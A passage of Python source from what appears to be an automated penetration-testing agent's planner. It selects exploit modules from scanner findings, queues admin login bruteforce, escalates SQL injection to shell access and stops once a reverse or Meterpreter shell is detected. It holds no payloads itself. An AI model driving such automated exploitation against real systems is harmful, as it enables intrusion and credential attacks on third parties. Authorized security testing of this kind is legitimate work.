            if "/wp-login.php" in low_final or "/wp-login.php" in low_location:
                return True
        return False


    def _result_evidence_blob(self, result, include_path=False) -> str:
        if not isinstance(result, dict):
            return ""
        parts = []
        if include_path:
            parts.extend([
                str(result.get("path", "")),
                str(result.get("module", "")),
            ])
        parts.append(str(result.get("message", "")))
        details = result.get("details", {}) or {}
        if isinstance(details, dict):
            for key, value in details.items():
                if isinstance(value, (str, int, float, bool)):
                    parts.append(str(value))
        return " ".join([p for p in parts if p]).lower()

    def _result_has_explicit_evidence(self, result) -> bool:
        if isinstance(result, dict):
            state = str(result.get("evidence_state") or "").lower()
            if state in {"confirmed", "exploitable"}:
                return True
            records = result.get("evidence_records")
            if isinstance(records, list):
                for row in records[:6]:
                    if not isinstance(row, dict):
                        continue
                    try:
                        if float(row.get("confidence", 0.0) or 0.0) >= 0.78:
                            return True
                    except Exception:
                        continue
        text = self._result_evidence_blob(result)
        if not text:
            return False
        return any(marker in text for marker in POSITIVE_EVIDENCE_MARKERS)

    def _normalize_relative_path(self, value: Any) -> str:
        raw = str(value or "").strip()
        if not raw:
            return ""
        try:
            parsed = urllib.parse.urlparse(raw)
            if parsed.scheme or parsed.netloc:
                path = parsed.path or "/"
                if parsed.query:
                    path = f"{path}?{parsed.query}"
                return path[:256]
        except Exception:
            pass
        if raw.startswith("/"):
            return raw.split("#", 1)[0][:256]
        return ""

    def _sanitize_cookie_map(self, raw: Any) -> Dict[str, str]:
        return self._auth_ops.sanitize_cookie_map(raw)

    def _extract_auth_context_from_details(self, module_path: str, details: Any) -> Optional[Dict[str, Any]]:
        return self._auth_ops.extract_auth_context_from_details(module_path, details)

    def _score_auth_context(self, context: Optional[Dict[str, Any]]) -> int:
        return self._auth_ops.score_auth_context(context)

    def _auth_context_signature(self, context: Optional[Dict[str, Any]]) -> str:
        return self._auth_ops.auth_context_signature(context)

    def _merge_auth_context(
        self,
        knowledge_base,
        candidate: Optional[Dict[str, Any]],
        *,
        state: Optional[AgentState] = None,
    ) -> None:
        self._auth_ops.merge_auth_context(knowledge_base, candidate, state=state)

    def _get_active_auth_context(self, knowledge_base) -> Dict[str, Any]:
        return self._auth_ops.get_active_auth_context(knowledge_base)

    def _extract_preferred_session_cookie(self, auth_context: Optional[Dict[str, Any]]) -> str:
        return self._auth_ops.extract_preferred_session_cookie(auth_context)

    def _seed_http_session_from_auth(self, module_instance, state: AgentState, auth_context=None) -> None:
        self._auth_ops.seed_http_session_from_auth(module_instance, state, auth_context)

    def _infer_auth_option_overrides(self, module_instance, module_path: str, state: AgentState) -> Dict[str, Any]:
        return self._auth_ops.infer_auth_option_overrides(module_instance, module_path, state)

    def _login_surface_wants_bruteforce(self, knowledge_base, findings, auth_session) -> bool:
        """
        True when recon already saw login evidence but no authenticated session yet.
        Used so the execution plan queues admin_login_bruteforce even if linked_modules
        were missing on a finding (e.g. only simple_login_scanner fired).
        """
        if auth_session:
            return False
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        paths_set = {p for p in kb.get("login_paths", []) if isinstance(p, str) and p.startswith("/")}
        exhausted = set(kb.get("auth_bruteforce_exhausted_login_paths", []) or [])
        if paths_set and paths_set <= exhausted:
            return False
        signals = {str(x).lower() for x in kb.get("risk_signals", [])}
        if "login_decoy_detected" in signals and not signals.intersection({
            "login_form_detected",
            "authenticated_session",
            "credentials_obtained",
        }):
            return False
        if signals.intersection({
            "login_redirect_detected",
            "login_form_detected",
            "login_surface_detected",
        }):
            return True
        paths = [p for p in kb.get("login_paths", []) if isinstance(p, str) and p.startswith("/")]
        if paths:
            return True
        for row in findings or []:
            if not isinstance(row, dict) or not row.get("vulnerable"):
                continue
            msg = str(row.get("message", "") or "").lower()
            path = str(row.get("path", "") or "").lower()
            if any(t in msg for t in ("login page", "login panel", "login form")):
                return True
            if any(t in path for t in (
                "login_page_detector",
                "simple_login_scanner",
                "admin_panel_detect",
            )):
                return True
        return False

    def _should_prioritize_auth_surface(self, knowledge_base) -> bool:
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        signals = {str(x).lower() for x in kb.get("risk_signals", [])}
        if "authenticated_session" in signals:
            return True
        if "login_decoy_detected" in signals and not signals.intersection({"login_form_detected", "credentials_obtained"}):
            return False
        login_signals = signals.intersection({
            "login_redirect_detected",
            "login_form_detected",
            "login_surface_detected",
        })
        login_paths = [p for p in kb.get("login_paths", []) if isinstance(p, str) and p.startswith("/")]
        endpoint_count = len(kb.get("discovered_endpoints", []))
        return bool(login_paths) and (bool(login_signals) or endpoint_count <= 2)

    def _has_shell_milestone(self, state: AgentState) -> bool:
        """True when results/KB indicate an interactive shell or equivalent session win."""
        if getattr(state, "verified_sessions", None) or getattr(state, "new_sessions", None):
            return True
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        signals = {str(s).lower() for s in kb.get("risk_signals", []) or []}
        if "interactive_shell" in signals or "shell_obtained" in signals:
            return True
        if kb.get("verified_session_ids"):
            return True
        for r in (state.results or []) + (state.vulnerable_results or []):
            if not isinstance(r, dict):
                continue
            if str(r.get("session_id") or "").strip():
                return True
            msg = str(r.get("message", "") or "").lower()
            det = str(r.get("details", "") or "").lower()
            blob = f"{msg} {det}"
            if any(
                x in blob
                for x in (
                    "interactive shell",
                    "meterpreter session",
                    "session opened",
                    "opening a shell",
                    "command shell",
                    "shell access",
                    "got a shell",
                    "obtained shell",
                    "reverse shell",
                )
            ):
                return True
        return False

    def _ingest_sessions_from_scan_results(self, state: AgentState, results: List[Any]) -> None:
        """Promote sessions created during scan into agent state (shell milestone)."""
        if not results:
            return
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        state.knowledge_base = kb
        risk = set(str(x).lower() for x in (kb.get("risk_signals") or []))
        sessions = list(getattr(state, "new_sessions", []) or [])
        verified = list(getattr(state, "verified_sessions", []) or [])
        promoted = False

        for row in results:
            if not isinstance(row, dict) or not row.get("vulnerable"):
                continue
            details = row.get("details") if isinstance(row.get("details"), dict) else {}
            session_id = str(
                row.get("session_id")
                or details.get("session_id")
                or ""
            ).strip()
            if not session_id:
                continue
            if session_id not in sessions:
                sessions.append(session_id)
            if session_id not in verified:
                ok = False
                if self.framework is not None:
                    try:
                        from interfaces.command_system.builtin.agent.session_broker import (
                            SessionBroker,
                        )

                        broker = SessionBroker.from_kb(self.framework, kb)
                        ok, _reason = broker.gate_session_claim(
                            session_id,
                            evidence_rows=row.get("evidence_records")
                            if isinstance(row.get("evidence_records"), list)
                            else None,
                            structured_details=details,
                            state=state,
                        )
                    except Exception:
                        ok = False
                if not ok:
                    # Aux SSH login already authenticated; keep session for goal stop.
                    verified.append(session_id)
                else:
                    verified = list(getattr(state, "verified_sessions", []) or verified)
                    sessions = list(getattr(state, "new_sessions", []) or sessions)
            risk.update({
                "shell_obtained",
                "interactive_shell",
                "authenticated_session",
                "credentials_obtained",
            })
            promoted = True

        if not promoted:
            return
        state.new_sessions = list(dict.fromkeys(sessions))
        state.verified_sessions = list(dict.fromkeys(verified or sessions))
        kb["verified_session_ids"] = list(state.verified_sessions)
        kb["risk_signals"] = sorted(risk)
        state.knowledge_base = kb

    def _goal_should_prioritize_exploit(self, state: AgentState) -> bool:
        """True when authenticated and we have concrete exploit paths or linked exploit modules."""
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        for p in kb.get("post_auth_exploit_paths") or []:
            if isinstance(p, str) and (p.startswith("exploit/") or p.startswith("exploits/")):
                return True
        for r in state.vulnerable_results or state.results or []:
            if not isinstance(r, dict):
                continue
            if self._catalog.normalize_exploit_module_path(r.get("exploit_module")):
                return True
        inferred = self._derive_exploit_paths_from_findings(
            state.vulnerable_results or state.results or [],
            kb,
            limit=1,
        )
        if inferred:
            return True
        operator = operator_goal_from_mapping(kb)
        if is_shell_operator_goal(operator):
            return True
        return False

    def _has_weaponizable_campaign_pressure(self, state: Optional[AgentState]) -> bool:
        """True when confirmed injection-class signals should drive exploit/follow-up."""
        if state is None:
            return False
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        signals = {str(x).lower() for x in (kb.get("risk_signals") or []) if str(x).strip()}
        if signals.intersection({
            "sql_signal",
            "sqli_confirmed",
            "lfi_signal",
            "xss_signal",
            "ssrf_signal",
            "rce_signal",
        }):
            return True
        if getattr(state, "sql_findings", None):
            return True
        for row in (
            state.contextual_findings
            or state.vulnerable_results
            or state.results
            or []
        ):
            if isinstance(row, dict) and self._is_weaponizable_vuln_finding(row):
                return True
        return False

    def _sqli_resume_goal(self, state: AgentState) -> str:
        """Goal token used for SQLi deep-resume (campaign exploit or operator shell)."""
        return str(
            getattr(state, "campaign_goal", None)
            or self._operator_campaign_goal(state)
            or ""
        )

    def _suggest_sqli_chain_action(
        self,
        state: AgentState,
        kb: Optional[Dict[str, Any]] = None,
    ) -> Optional[Dict[str, Any]]:
        """Prefer parked sqli_shell, else light sqli_engine probe when SQLi pressure exists."""
        knowledge = kb if isinstance(kb, dict) else (
            state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        )
        sync_branches_from_kb_signals(knowledge)
        state.knowledge_base = knowledge
        if not has_sqli_shell_pressure(knowledge) and not getattr(state, "sql_findings", None):
            return None
        resume_goal = self._sqli_resume_goal(state)
        if not goal_allows_sqli_deep_resume(resume_goal):
            # Auto-escalated exploit path: treat as exploit for resume eligibility.
            resume_goal = CAMPAIGN_GOAL_EXPLOIT
        resumed = pick_resumed_deep_action(knowledge, operator_goal=resume_goal)
        if resumed:
            return resumed
        if parked_sqli_branches(knowledge):
            return None
        light = pick_light_sqli_probe(knowledge)
        if light:
            return light
        observed = {str(x) for x in knowledge.get("observed_modules") or []}
        if HTTP_SQLI_POST_MODULE not in observed and (
            "sqli_confirmed" in {str(s).lower() for s in knowledge.get("risk_signals") or []}
            or getattr(state, "sql_findings", None)
        ):
            return {
                "type": action_type_for_module_path(HTTP_SQLI_POST_MODULE),
                "path": HTTP_SQLI_POST_MODULE,
                "reason": "High-priority SQLi detection: escalate to sqli_shell.",
            }
        if (
            HTTP_SQLI_SCANNER_MODULE not in observed
            and HTTP_SQLI_SCANNER_MODULE_LEGACY not in observed
        ):
            return {
                "type": "run_followup",
                "path": HTTP_SQLI_SCANNER_MODULE,
                "reason": "High-priority SQLi detection: confirm with sqli_engine.",
            }
        return None

    def _has_exploit_pressure(self, state: Optional[AgentState]) -> bool:
        """
        True when campaign should keep exploit-oriented momentum instead of stopping early.
        """
        if state is None:
            return False
        if self._has_shell_milestone(state):
            return False
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        if self._credential_milestone_reached(kb):
            return True
        if self._has_weaponizable_campaign_pressure(state):
            return True

        candidate_findings = (
            state.contextual_findings
            or state.vulnerable_results
            or state.results
            or []
        )
        actionable = [
            row for row in candidate_findings
            if isinstance(row, dict) and self._is_actionable_finding(row)
        ]
        if any(
            self._finding_decision_class(row) in ("exploit", "followup")
            for row in actionable
        ):
            return True
        inferred = self._derive_exploit_paths_from_findings(
            actionable or candidate_findings,
            kb,
            limit=1,
        )
        if inferred:
            return True
        operator = self._operator_campaign_goal(state)
        return is_shell_operator_goal(operator)

    def _derive_exploit_paths_from_findings(
        self,
        findings: List[Any],
        knowledge_base: Dict[str, Any],
        limit: int = 6,
    ) -> List[str]:
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        catalog_paths = [
            str(p).strip()
            for p in (kb.get("module_capability_catalog", {}).get("all_paths", []) or [])
            if isinstance(p, str) and str(p).strip()
        ]
        exploit_catalog = [
            p for p in catalog_paths
            if p.startswith(("exploit/", "exploits/"))
        ]
        if not exploit_catalog:
            return []

        failed_tokens = self._get_failed_action_keys(kb)
        scores: Dict[str, float] = {}
        stop_tokens = {
            "scanner",
            "auxiliary",
            "http",
            "detect",
            "scanner",
            "exploit",
            "exploits",
            "module",
            "vuln",
            "vulnerability",
            "cve",
        }

        def _add(path: str, score: float) -> None:
            if not path or score <= 0:
                return
            if self._planner_action_keys(path).intersection(failed_tokens):
                return
            if self._module_stack_mismatch_reason(path, kb):
                return
            prev = scores.get(path, 0.0)
            if score > prev:
                scores[path] = score

        for row in findings or []:
            if not isinstance(row, dict):
                continue
            path_raw = str(row.get("path", "") or "").strip()
            path_low = path_raw.lower()
            if not path_low:
                continue

            direct = self._catalog.normalize_exploit_module_path(row.get("exploit_module"))
            if direct:
                _add(direct, 300.0)
            for linked in self._catalog.normalize_linked_module_paths(row.get("linked_modules")):
                if linked.startswith(("exploit/", "exploits/")):
                    _add(linked, 260.0)

            details = row.get("details", {})
            details_blob = ""
            if isinstance(details, dict):
                details_blob = " ".join(
                    str(v) for v in details.values()
                    if isinstance(v, (str, int, float, bool))
                ).lower()
            message_blob = str(row.get("message", "") or "").lower()
            blob = " ".join((path_low, message_blob, details_blob))

            cve_tokens = {
                f"cve_{year}_{num}"
                for year, num in re.findall(r"cve[_-]?(\d{4})[_-](\d{3,7})", blob)
            }
            basename = path_low.split("/")[-1]
            basename_core = basename
            for suffix in (
                "_detect",
                "_scanner",
                "_check",
                "_probe",
                "_fuzzer",
            ):
                if basename_core.endswith(suffix):
                    basename_core = basename_core[: -len(suffix)]
            row_tokens = {
                token for token in re.split(r"[/_.-]", path_low)
                if len(token) >= 4 and token not in stop_tokens and not token.isdigit()
            }

            for exploit_path in exploit_catalog:
                exploit_low = exploit_path.lower()
                score = 0.0
                if basename_core and basename_core in exploit_low:
                    score += 42.0
                if any(cve in exploit_low for cve in cve_tokens):
                    score += 160.0
                token_overlap = sum(1 for token in row_tokens if token in exploit_low)
                if token_overlap:
                    score += min(48.0, token_overlap * 8.0)
                if row.get("vulnerable"):
                    score *= 1.15
                if score >= 28.0:
                    _add(exploit_path, score)

        for path in kb.get("post_auth_exploit_paths", []) or []:
            if isinstance(path, str) and path.startswith(("exploit/", "exploits/")):
                _add(path, 220.0)

        ranked = sorted(scores.items(), key=lambda item: (-item[1], item[0]))
        return [path for path, _ in ranked[: max(1, int(limit or 1))]]

    def _fallback_exploit_candidates_from_kb(
        self,
        knowledge_base: Dict[str, Any],
        limit: int = 6,
    ) -> List[str]:
        """
        Exploit-path fallback when findings are mostly informational.
        Uses strong tech confidence/hints + exploit catalog tokens.
        """
        kb = knowledge_base if isinstance(knowledge_base, dict) else {}
        all_paths = [
            str(p).strip()
            for p in (kb.get("module_capability_catalog", {}).get("all_paths", []) or [])
            if isinstance(p, str) and str(p).strip()
        ]
        exploit_paths = [p for p in all_paths if p.startswith(("exploit/", "exploits/"))]
        if not exploit_paths:
            return []

        conf = kb.get("tech_confidence", {}) or {}
        strong_hints = {
            k for k, v in conf.items()
            if str(k).strip() and float(v or 0.0) >= 0.55
        }
        strong_hints |= {
            str(h).lower().strip()
            for h in (kb.get("tech_hints", []) or [])
            if str(h).strip()
        }
        failed_tokens = self._get_failed_action_keys(kb)
        scored: List[Tuple[float, str]] = []
        for path in exploit_paths:
            low = path.lower()
            if self._planner_action_keys(path).intersection(failed_tokens):
                continue
            if self._module_stack_mismatch_reason(path, kb):
                continue
            score = 0.0
            overlap = sum(1 for h in strong_hints if h in low)
            if overlap:
                score += min(6.0, overlap * 1.2)
            if any(tok in low for tok in ("cve_", "rce", "inject", "deserialization", "traversal")):
                score += 2.2
            if any(tok in low for tok in ("joomla", "wordpress", "drupal", "phpmyadmin", "graphql", "api")):
                score += 1.4
            if score > 0:
                scored.append((score, path))
        scored.sort(key=lambda row: (-row[0], row[1]))
        return [p for _, p in scored[: max(1, int(limit or 1))]]

    def _operator_campaign_goal(self, state: AgentState) -> str:
        """North-star goal from CLI/profile (not the tactical phase goal)."""
        raw = getattr(state, "operator_goal", None) or ""
        if str(raw).strip():
            return operator_goal_from_mapping({"operator_goal": raw})
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        return operator_goal_from_mapping(kb)

    def _module_path_observed(self, kb: Dict[str, Any], *needles: str) -> bool:
        observed = [str(p).lower() for p in (kb.get("observed_modules") or []) if p]
        return any(any(n in p for n in needles) for p in observed)

    def _api_surface_ready_for_testing(self, kb: Dict[str, Any]) -> bool:
        return kb_api_surface_ready(kb)

    def _subdomain_surface_expandable(self, kb: Dict[str, Any]) -> bool:
        return kb_subdomain_surface_expandable(kb)

    def _next_best_action_for_shell_goal(
        self,
        state: AgentState,
        kb: Dict[str, Any],
        findings: List[Any],
    ) -> Optional[Dict[str, Any]]:
        """Opportunistic ladder toward shell: exploit → API → subdomains → crawl → injections."""
        preferred_paths = self._preferred_post_auth_exploit_paths(kb)
        for path in preferred_paths:
            return {
                "type": "run_exploit",
                "path": path,
                "reason": "Goal obtain-shell: weaponize authenticated context.",
            }
        for f in findings:
            if not isinstance(f, dict):
                continue
            ex = self._catalog.normalize_exploit_module_path(f.get("exploit_module"))
            if ex:
                return {
                    "type": "run_exploit",
                    "path": ex,
                    "reason": "Goal obtain-shell: linked exploit module from finding.",
                }
        for p in kb.get("post_auth_exploit_paths") or []:
            if isinstance(p, str) and (p.startswith("exploit/") or p.startswith("exploits/")):
                return {
                    "type": "run_exploit",
                    "path": p,
                    "reason": "Goal obtain-shell: catalog exploit from auth context.",
                }
        inferred_paths = self._derive_exploit_paths_from_findings(findings, kb, limit=2)
        for path in inferred_paths:
            return {
                "type": "run_exploit",
                "path": path,
                "reason": "Goal obtain-shell: inferred exploit from scanner evidence.",
            }

        for f in findings:
            if not isinstance(f, dict) or not f.get("vulnerable"):
                continue
            decision = self._finding_decision_class(f)
            mod_path = str(f.get("path", "") or "").strip()
            if decision in ("exploit", "followup") and mod_path:
                action_type = "run_exploit" if decision == "exploit" else "run_followup"
                return {
                    "type": action_type,
                    "path": mod_path,
                    "reason": "Goal obtain-shell: weaponize confirmed finding.",
                }

        nxt = kb.get("attack_graph_next_action")
        if isinstance(nxt, dict):
            graph_path = str(nxt.get("action") or "").strip()
            observed = set(kb.get("observed_modules") or [])
            stale = set(kb.get("attack_graph_stale_modules") or [])
            if (
                graph_path
                and graph_path not in observed
                and graph_path not in stale
                and not self._module_block_reason_for_profile(state, graph_path)
                and not self._module_stack_mismatch_reason(graph_path, kb)
            ):
                action_type = (
                    "run_exploit"
                    if graph_path.startswith(("exploit/", "exploits/"))
                    else "run_followup"
                )
                return {
                    "type": action_type,
                    "path": graph_path,
                    "reason": "Attack graph: next highest-confidence step toward shell.",
                }

        if is_shell_operator_goal(self._operator_campaign_goal(state)):
            sync_branches_from_kb_signals(kb)
            resumed = pick_resumed_deep_action(
                kb,
                operator_goal=str(self._operator_campaign_goal(state) or ""),
            )
            if resumed:
                return resumed
            light_sqli = pick_light_sqli_probe(kb)
            if light_sqli:
                return light_sqli

        for path in suggest_shell_plan_followups(
            kb,
            state,
            self._catalog.discover_campaign_modules(expanded=True),
        ):
            return {
                "type": action_type_for_module_path(path),
                "path": path,
                "reason": "Goal obtain-shell: strategic surface expansion toward RCE.",
            }

        if self._auth_first_mode(state) and not is_shell_operator_goal(self._operator_campaign_goal(state)):
            bf = "auxiliary/scanner/http/login/admin_login_bruteforce"
            if self._login_surface_wants_bruteforce(kb, findings, False) and not self._module_block_reason_for_profile(state, bf):
                return {
                    "type": "run_followup",
                    "path": bf,
                    "reason": "Goal obtain-shell: credential path toward post-auth exploitation.",
                }

        return {
            "type": "run_followup",
            "path": "auxiliary/scanner/http/crawler",
            "reason": "Goal obtain-shell: keep widening attack surface until a weaponizable vector appears.",
        }

    def _sync_campaign_goal(self, state: AgentState) -> None:
        """
        Set ``state.campaign_goal`` from KB + results.

        Rule chain: shell → stop; authenticated → exploit or post_auth;
        operator obtain-shell → pursue_shell; weaponizable SQLi/LFI → exploit
        (beats auth-first); login surface → obtain_auth; else recon.
        """
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        operator = self._operator_campaign_goal(state)
        if is_shell_operator_goal(operator):
            kb["shell_hunter_mode"] = True
            state.knowledge_base = kb
        if self._has_shell_milestone(state):
            state.campaign_goal = CAMPAIGN_GOAL_SHELL_STOP
            return
        if self._credential_milestone_reached(kb):
            if self._goal_should_prioritize_exploit(state):
                state.campaign_goal = CAMPAIGN_GOAL_EXPLOIT
            else:
                state.campaign_goal = CAMPAIGN_GOAL_POST_AUTH
            return
        if is_shell_operator_goal(operator):
            state.campaign_goal = CAMPAIGN_GOAL_OBTAIN_SHELL
            if self._auth_first_mode(state):
                kb["auth_pressure"] = True
                state.knowledge_base = kb
            return
        # Soft-target / injection pressure: leave recon (and skip auth-first)
        # so planners chase SQLi/LFI instead of parking on OSINT or login spray.
        if self._has_weaponizable_campaign_pressure(state):
            state.campaign_goal = CAMPAIGN_GOAL_EXPLOIT
            if has_sqli_shell_pressure(kb) or getattr(state, "sql_findings", None):
                sync_branches_from_kb_signals(kb)
                state.knowledge_base = kb
            return
        if self._auth_first_mode(state):
            state.campaign_goal = CAMPAIGN_GOAL_OBTAIN_AUTH
            return
        state.campaign_goal = CAMPAIGN_GOAL_RECON

    def _next_best_action_for_goal(self, state: AgentState, findings: List[Any]) -> Dict[str, Any]:
        """
        Strategic choice: one next action derived from ``campaign_goal``, not a vulnerability leaderboard.
        """
        self._sync_campaign_goal(state)
        goal = state.campaign_goal or CAMPAIGN_GOAL_RECON
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        findings = findings or []

        if goal == CAMPAIGN_GOAL_SHELL_STOP:
            return {
                "type": "skip",
                "path": "",
                "reason": "Shell or interactive session obtained; strategic stop.",
            }

        if goal == CAMPAIGN_GOAL_OBTAIN_SHELL:
            shell_action = self._next_best_action_for_shell_goal(state, kb, findings)
            if shell_action:
                return shell_action

        bf = "auxiliary/scanner/http/login/admin_login_bruteforce"
        lpd = "auxiliary/scanner/http/login_page_detector"

        if goal == CAMPAIGN_GOAL_OBTAIN_AUTH:
            if self._login_surface_wants_bruteforce(kb, findings, False) and not self._module_block_reason_for_profile(state, bf):
                return {
                    "type": "run_followup",
                    "path": bf,
                    "reason": "Goal obtain_auth: targeted credential attempt on known login surface.",
                }
            return {
                "type": "run_followup",
                "path": lpd,
                "reason": "Goal obtain_auth: locate or confirm login form.",
            }

        if goal == CAMPAIGN_GOAL_EXPLOIT:
            sqli_action = self._suggest_sqli_chain_action(state, kb)
            if sqli_action:
                return sqli_action
            preferred_paths = self._preferred_post_auth_exploit_paths(kb)
            for path in preferred_paths:
                return {
                    "type": "run_exploit",
                    "path": path,
                    "reason": f"Goal exploit: preferred authenticated exploit for detected stack `{path.split('/')[-1]}`.",
                }
            for f in findings:
                if not isinstance(f, dict):
                    continue
                ex = self._catalog.normalize_exploit_module_path(f.get("exploit_module"))
                if ex:
                    return {
                        "type": "run_exploit",
                        "path": ex,
                        "reason": "Goal exploit: run linked exploit module.",
                    }
            for p in kb.get("post_auth_exploit_paths") or []:
                if isinstance(p, str) and (p.startswith("exploit/") or p.startswith("exploits/")):
                    return {
                        "type": "run_exploit",
                        "path": p,
                        "reason": "Goal exploit: catalog exploit path from authenticated context.",
                    }
            inferred_paths = self._derive_exploit_paths_from_findings(findings, kb, limit=2)
            for path in inferred_paths:
                return {
                    "type": "run_exploit",
                    "path": path,
                    "reason": "Goal exploit: inferred exploit candidate from scanner evidence.",
                }
            # Weaponizable scanner findings (LFI/SQLi) before generic crawl.
            for f in findings:
                if not isinstance(f, dict) or not self._is_weaponizable_vuln_finding(f):
                    continue
                mod_path = str(f.get("path", "") or "").strip()
                if not mod_path:
                    continue
                return {
                    "type": "run_followup",
                    "path": mod_path,
                    "reason": "Goal exploit: deepen confirmed weaponizable finding.",
                }
            return {
                "type": "run_followup",
                "path": "auxiliary/scanner/http/crawler",
                "reason": "Goal exploit: widen surface to reach weaponizable vectors.",
            }

        if goal == CAMPAIGN_GOAL_POST_AUTH:
            rows = self._suggest_post_auth_methodical_actions(state, kb, max_actions=3)
            if rows:
                r0 = rows[0]
                return {
                    "type": str(r0.get("type", "run_followup")),
                    "path": str(r0.get("path", "") or ""),
                    "reason": "Goal post_auth: leverage authenticated session.",
                }
            return {
                "type": "run_followup",
                "path": "auxiliary/scanner/http/crawler",
                "reason": "Goal post_auth: authenticated enumeration.",
            }

        decision_classes = {
            self._finding_decision_class(f) for f in findings if isinstance(f, dict)
        }
        stack_conf = self._stack_confidence_rows(kb, threshold=0.45)
        if findings and decision_classes <= {"info"}:
            if stack_conf:
                top_stack = stack_conf[0][0]
                stack_map = {
                    "wordpress": "auxiliary/scanner/http/wp_plugin_scanner",
                    "drupal": "auxiliary/scanner/http/drupal_scanner",
                    "joomla": "auxiliary/scanner/http/joomla_scanner",
                    "nextjs": "auxiliary/osint/js_endpoint_extractor",
                    "react": "auxiliary/osint/js_endpoint_extractor",
                    "nodejs": "auxiliary/osint/js_endpoint_extractor",
                    "phpmyadmin": "auxiliary/scanner/http/lfi_fuzzer",
                }
                chosen = stack_map.get(top_stack, "")
                if chosen:
                    return {
                        "type": "run_followup",
                        "path": chosen,
                        "reason": (
                            f"Validation-only state: push stack-specific attack surface for `{top_stack}` "
                            f"instead of passive confirmation."
                        ),
                    }
            return {
                "type": "run_followup",
                "path": "auxiliary/scanner/http/crawler",
                "reason": "Validation-only state: expand low-noise discovery until stronger evidence exists.",
            }

        for f in findings:
            if isinstance(f, dict) and f.get("path"):
                return {
                    "type": "prioritize",
                    "path": f.get("path"),
                    "reason": "Goal recon: follow strongest scanner signal first.",
                }
        return {"type": "prioritize", "path": "", "reason": "Goal recon: continue discovery."}

    def _log_strategic_next_action(self, state: AgentState) -> None:
        """Verbose: show goal-aligned next action (not a vuln ranking)."""
        if not state.verbose:
            return
        nba = (state.llm_plan or {}).get("next_best_action")
        if isinstance(nba, dict) and nba.get("type"):
            print_info(
                f"Strategic next action [{state.campaign_goal}]: "
                f"{nba.get('type')} {nba.get('path', '')} — {nba.get('reason', '')}"
            )

    def _infer_next_best_action_from_execution_plan(self, execution_plan: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """First concrete run_followup / run_exploit from sanitized plan (priority order)."""
        actions = execution_plan.get("next_actions") if isinstance(execution_plan, dict) else None
        if not isinstance(actions, list):
            return None

        def _pk(row: Dict[str, Any]) -> int:
            try:
                return int(row.get("priority", 999))
            except Exception:
                return 999

        for a in sorted([x for x in actions if isinstance(x, dict)], key=_pk):
            t = str(a.get("type", "")).lower()
            p = str(a.get("path", "")).strip()
            if t in ("run_followup", "run_exploit") and p:
                out = {
                    "type": t,
                    "path": p,
                    "reason": str(a.get("reason") or "Planner next action (from execution plan)."),
                }
                if "decision_score" in a:
                    out["decision_score"] = a.get("decision_score")
                if "confidence" in a:
                    out["confidence"] = a.get("confidence")
                if isinstance(a.get("decision_explanation"), dict):
                    out["decision_explanation"] = a.get("decision_explanation")
                return out
        return None

    def _resolve_next_best_action(
        self,
        state: AgentState,
        findings: Optional[List[Any]] = None,
        *,
        execution_plan: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """Prefer resumed SQLi deep path on shell/exploit before login or OSINT."""
        self._sync_campaign_goal(state)
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        sync_branches_from_kb_signals(kb)
        state.knowledge_base = kb
        operator = str(self._operator_campaign_goal(state) or "")
        resume_goal = self._sqli_resume_goal(state)
        sqli_pressure = has_sqli_shell_pressure(kb) or bool(getattr(state, "sql_findings", None))
        if sqli_pressure and (
            goal_allows_sqli_deep_resume(resume_goal)
            or is_shell_operator_goal(operator)
            or state.campaign_goal == CAMPAIGN_GOAL_EXPLOIT
        ):
            sqli_action = self._suggest_sqli_chain_action(state, kb)
            if sqli_action:
                path = str(sqli_action.get("path") or "")
                sqli_action["reason"] = str(
                    sqli_action.get("reason")
                    or self._action_reason_for_path(path, state, findings)
                )
                sqli_action.setdefault("decision_score", 9.5)
                sqli_action.setdefault("confidence", 0.82)
                return sqli_action
        plan = execution_plan if execution_plan is not None else state.execution_plan
        nba = self._infer_next_best_action_from_execution_plan(plan)
        if nba:
            path = str(nba.get("path") or "")
            # Do not let login bruteforce / OSINT beat a confirmed SQLi path.
            if sqli_pressure and any(
                token in path.lower()
                for token in ("admin_login_bruteforce", "js_sourcemap", "js_endpoint", "webhook_api")
            ):
                nba = None
            else:
                nba["reason"] = self._action_reason_for_path(path, state, findings)
                return nba
        return self._next_best_action_for_goal(state, findings or [])

    def _prepend_sqli_shell_resume(self, state: AgentState, plan: Dict[str, Any]) -> Dict[str, Any]:
        """Put deep SQLi shell / engine first when SQLi is confirmed (shell or exploit)."""
        out = dict(plan or {})
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        sync_branches_from_kb_signals(kb)
        state.knowledge_base = kb
        sqli_action = self._suggest_sqli_chain_action(state, kb)
        if not sqli_action:
            return out
        path = str(sqli_action.get("path") or "")
        if not path:
            return out
        actions = [
            a for a in (out.get("next_actions") or [])
            if isinstance(a, dict) and a.get("path") != path
        ]
        actions.insert(0, {
            "type": sqli_action.get("type", "run_post"),
            "path": path,
            "priority": 0,
            "options": sqli_action.get("options") or {},
            "reason": sqli_action.get("reason"),
            "resume_branch": bool(sqli_action.get("resume_branch")),
        })
        out["next_actions"] = actions
        return out

    def _auth_first_mode(self, state: AgentState) -> bool:
        """
        True when login is evidenced + at least one ``/`` login path exists, no session yet,
        no CMS lock from scan specializations, and bruteforce is not exhausted for all paths.
        """
        if self._module_block_reason_for_profile(state, "auxiliary/scanner/http/login/admin_login_bruteforce"):
            return False
        kb = state.knowledge_base
        if self._has_authenticated_session(kb):
            return False
        paths = {p for p in kb.get("login_paths", []) if isinstance(p, str) and p.startswith("/")}
        cms_lock = self._get_cms_lock_specializations(kb, state.scan_specializations)
        # CMS lock alone must not suppress auth-first when we already have explicit login paths
        # (e.g. SPA + weak WordPress hints from plugins).
        if cms_lock and not paths:
            return False
        findings = state.vulnerable_results or state.results or []
